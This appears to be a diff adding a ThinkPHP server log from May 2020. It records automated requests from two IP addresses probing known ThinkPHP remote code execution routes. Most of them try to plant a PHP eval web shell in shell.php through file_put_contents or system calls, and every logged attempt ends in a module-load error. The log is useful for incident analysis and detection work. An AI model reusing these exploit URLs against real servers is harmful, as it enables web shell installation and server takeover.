@@ -1,0 +1,66 @@
+[ 2020-05-29T00:27:24+08:00 ] 124.95.178.58 //index.php/?s=captcha
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000005s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000163s ]
+ERR: 无法加载模块:Captcha
+
+[ 2020-05-29T00:27:24+08:00 ] 124.95.178.58 //index.php/?s=captcha
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000004s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000125s ]
+ERR: 无法加载模块:Captcha
+
+[ 2020-05-29T00:27:24+08:00 ] 124.95.178.58 //index.php/?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=shell.php&content=%22%3C?php%20@eval($_POST%5Bshell%5D);?%3E%22
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000006s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000160s ]
+ERR: 无法加载模块:Index
+
+[ 2020-05-29T00:27:24+08:00 ] 124.95.178.58 //index.php/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=shell.php&vars%5B1%5D%5B%5D=%22%3C?php%20@eval($_POST%5Bshell%5D);?%3E%22
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000005s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000128s ]
+ERR: 无法加载模块:Index
+
+[ 2020-05-29T00:27:24+08:00 ] 124.95.178.58 //index.php/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=echo%20%22%3C?php%20@eval($_POST%5Bshell%5D);?%3E%22%20%3E%3Eshell.php
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000007s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000189s ]
+ERR: 无法加载模块:Index
+
+[ 2020-05-29T00:27:24+08:00 ] 124.95.178.58 //index.php/?s=index/%5Cthink%5CRequest/input&filter=system&data=echo%20%22%3C?php%20@eval($_POST%5Bshell%5D);?%3E%22%20%3E%3Eshell.php
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000006s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000149s ]
+ERR: 无法加载模块:Index
+
+[ 2020-05-29T00:27:24+08:00 ] 124.95.178.58 //index.php/?s=index/%5Cthink%5CRequest/input&filter=phpinfo&data=echo%20%22%3C?php%20@eval($_POST%5Bshell%5D);?%3E%22%20%3E%3Eshell.php
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000005s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000163s ]
+ERR: 无法加载模块:Index
+
+[ 2020-05-29T00:27:24+08:00 ] 124.95.178.58 //index.php/?s=index/%5Cthink%5Cview%5Cdriver%5CPhp/display&content=echo%20%22%3C?php%20@eval($_POST%5Bshell%5D);?%3E%22%20%3E%3Eshell.php
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000005s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000138s ]
+ERR: 无法加载模块:Index
+
+[ 2020-05-29T00:27:25+08:00 ] 124.95.178.58 //index.php/?s=index/%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars%5B0%5D=phpinfo&vars%5B1%5D%5B%5D=echo%20%22%3C?php%20@eval($_POST%5Bshell%5D);?%3E%22%20%3E%3Eshell.php
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000004s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000121s ]
+ERR: 无法加载模块:Index
+
+[ 2020-05-29T00:27:25+08:00 ] 124.95.178.58 //index.php/?s=index/%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=echo%20%22%3C?php%20@eval($_POST%5Bshell%5D);?%3E%22%20%3E%3Eshell.php
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000005s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000126s ]
+ERR: 无法加载模块:Index
+
+[ 2020-05-29T04:11:10+08:00 ] 195.54.160.130 /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000005s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000121s ]
+ERR: 无法加载模块:Index
+
